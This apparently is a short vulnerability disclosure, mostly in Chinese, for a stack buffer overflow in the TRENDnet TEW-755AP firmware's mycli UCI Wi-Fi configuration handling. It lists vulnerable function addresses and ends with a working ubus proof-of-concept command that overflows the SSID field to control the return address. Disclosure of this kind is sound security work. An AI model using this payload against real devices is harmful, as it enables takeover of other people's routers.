# CVE-XXXX-XXXX: TEW-755AP sbin/mycli UCI Wifi Config Stack Overflow

| 厂商 TRENDnet | 产品 TEW-755AP v1.1.07b07 | CWE-121 | CVSS **9.8** |

## FirmRec 验证

```
0x41CC8C: frame=136B $ra@sp+132 — uci_get_option("wifi0_vap10.ssid")→FUN_401000 ★ 21 calls
0x41CEC4: frame=136B $ra@sp+132 — uci_get_option("wifi0_vap8.bssid")→FUN_401000 ★ 20 calls
0x41D1A4: frame=136B $ra@sp+132 — uci_get_option("wifi0_vap10.gbssid")→FUN_401000
0x4242E0: frame=136B $ra@sp+132 — uci_get_option("wifi1_vap10.ssid")→FUN_401000 ★ 2 ra-loads
0x4247B0: frame=136B $ra@sp+132 — uci_get_option("wifi1_vap10.gbssid")→FUN_401000
```

**9 个独立函数地址**，覆盖 wifi0/wifi1 双频的 SSID/BSSID/GBSSID 配置。Simexp: 374 日志击中 0x41414141。FUN_401000 是 strcpy 封装。

## PoC
```bash
ubus call uci set '{"config":"qcawifi","section":"wifi0_vap10","values":{"ssid":"'$(python3 -c "print('A'*68+'\x41\x41\x41\x41')")'"}}'
```
注：SSID 通过 Wi-Fi 信标帧公开广播，攻击者无需接入网络即可触发。
